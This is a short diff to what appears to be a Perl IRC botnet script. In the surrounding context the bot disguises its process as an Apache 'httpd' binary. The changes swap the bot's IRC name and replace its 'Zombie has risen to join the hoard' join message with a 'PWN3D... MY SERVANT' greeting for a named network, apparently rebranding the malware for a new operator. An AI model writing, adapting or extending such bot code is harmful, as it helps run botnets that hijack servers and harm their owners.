@@ -52,7 +52,7 @@ my @rps = ("/usr/local/apache/bin/httpd",
 my $process = $rps[rand scalar @rps];
 my @rversion = ("Phl4nk");
 my $vers = $rversion[rand scalar @rversion];
-my @rircname = ("cleiton");
+my @rircname = ("rogerao");
 my $ircname = $rircname[rand scalar @rircname];
 chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
@@ -282,7 +282,7 @@ elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
   foreach my $canal (@channels) {
     sendraw("MODE $nick +iw");
     sendraw("JOIN $canal");
-    sendraw("PRIVMSG $canal : A Zombie has risen to join the hoard");
+    sendraw("PRIVMSG $canal : H0H0H0 PWN3D!! WELCOME TO MACACOS NETWORK, MY SERVANT!");
 }
 }
 }
